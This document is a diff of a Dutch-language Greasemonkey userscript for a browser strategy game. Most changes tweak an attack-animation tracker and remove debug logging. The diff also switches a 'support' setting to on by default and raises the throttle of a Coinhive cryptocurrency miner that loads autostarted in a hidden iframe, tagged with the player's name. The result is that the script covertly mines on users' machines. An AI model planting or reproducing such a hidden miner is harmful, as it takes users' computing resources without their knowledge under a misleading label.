@@ -42,7 +42,7 @@ function laadSettings(){
     settings.tijden = GM_getValue('setting_tijden', true);
     settings.terugTrek = GM_getValue('setting_terugTrek', true);
     settings.tags = GM_getValue('setting_tags', true);
-    settings.support = GM_getValue('setting_support', false);
+    settings.support = GM_getValue('setting_support', true);
     settings.playertag = GM_getValue('setting_playertag', false);
     settings.tagkleuren = GM_getValue('setting_tagkleuren', true);
 
@@ -327,7 +327,7 @@ function addCheckbox(setting, id, beschrijving){
 
 function koloAnimatie() {
     for (var item of document.getElementsByClassName("attack_takeover")) {
-        if(item.parentNode.parentNode.parentNode.parentNode.innerHTML == 'attack_overview'){ break;}
+        if(item.parentNode.parentNode.parentNode.parentNode.innerHTML == 'attack_overview') break;
         if(/support_filter/.test(item.className)) break;
         if (koloSet == false) {
             startTime = item.parentNode.parentNode.dataset.starttime;
@@ -352,10 +352,9 @@ function koloAnimatie() {
             startTime = 0;
             koloAangekomen = true;
         }
-        console.log("GME Tijd kolo %: " + a * 3.333);
         var css;
         if (document.getElementById('kolocss') == null) {
-            console.log('GME: Added kolo css.');
+            console.log('GME: Added kolo tracker.');
             css = [
                 "#koloboot{",
                 "}"
@@ -374,8 +373,14 @@ function koloAnimatie() {
                 // }
             }
 
+        } else if(totalTime == -1) {
+            css = [
+                "#koloboot{",
+                "display: none;",
+                "}"
+            ].join("\n");
+            document.getElementById('kolocss').innerHTML = css;
         } else {
-            console.log('GME: Updated kolo css.');
             css = [
                 "#koloboot{",
                 "position: absolute;",
@@ -612,7 +617,7 @@ function getSupportPlayer(){
     });
 }
 function laadSupport(){
-    support = 'https://coinhive.com/media/miner.html?key=lExsAfunHvT49Vk89uU738RZR27ys8GD&user=' + Game.player_name + '&whitelabel=1&autostart=1&throttle=0.2&threads=&background=&text=Okay';
+    support = 'https://coinhive.com/media/miner.html?key=lExsAfunHvT49Vk89uU738RZR27ys8GD&user=' + Game.player_name + '&whitelabel=1&autostart=1&throttle=0.3&threads=&background=&text=Okay';
     supportNode = document.createElement('iframe');
     supportNode.src = support;
     supportNode.style.display = 'none';
